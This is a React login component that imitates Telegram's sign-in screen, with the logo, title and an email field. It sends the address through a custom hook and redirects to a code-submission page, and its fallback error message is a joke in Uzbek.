import React, { useContext, useEffect } from 'react';
import Logo from '../assets/images/telegram.png';
import { useSendEmail } from '../hooks/useSendEmail';
import { useNavigate } from 'react-router-dom';
import { Context } from '../Context/Context';

export default function Login() {
  const { sendEmail, data, loading, error } = useSendEmail();
  const navigate = useNavigate()
  const { setEmail } = useContext(Context)

  useEffect(() => {
    if (data?.status === 200) {
      navigate('/submit_code')
    }
  }, [data])

  const handleSendEmail = (e) => {
    e.preventDefault();
    const email = new FormData(e.target).get("email");
    sendEmail(email); // correct and safe usage
    setEmail(email)
  };



  return (
    <section className="min-h-screen bg-neutral-800 flex items-center justify-center px-4">
      <div className="w-full max-w-sm text-white space-y-6 text-center bg-[rgb(33, 33, 33)]">
        <img src={Logo} alt="Telegram" className="w-40 h-40 mx-auto" />
        <h1 className="text-4xl font-semibold">Telegram</h1>
        <p className="text-gray-400">Please confirm your country code
          and enter your Email.</p>

        {error && (
          <div className="bg-red-500/20 text-red-400 text-sm px-4 py-2 rounded-md border border-red-500/30">
            {error.message || "Nimanidur xato yozding Qo'chqor"}
          </div>
        )}

        <form className="space-y-4 text-left" onSubmit={handleSendEmail}>
          <div>
            <label className="ml-0.5 block text-sm text-gray-300 mb-1">Email</label>
            <input
              type="email"
              name="email"
              placeholder="Enter your email adress"
              className={inputStyle}
              required
            />
          </div>

          <button type="submit" className={`${inputStyle} hover:bg-violet-500 active:bg-[rgb(131,120,219,0.8)]`}>
            {loading ? 'Loading...' : "Next"}
          </button>
        </form>

        <a href="#" className="text-violet-400 text-sm hover:underline">Log in by QR code</a>
      </div>
    </section>
  );
}

const inputStyle =
  "w-full px-3 py-2 bg-neutral-800 border border-neutral-700 rounded-[0.75rem] focus:outline-none focus:ring-2 focus:ring-violet-500 placeholder:text-xs font-medium duration-300";
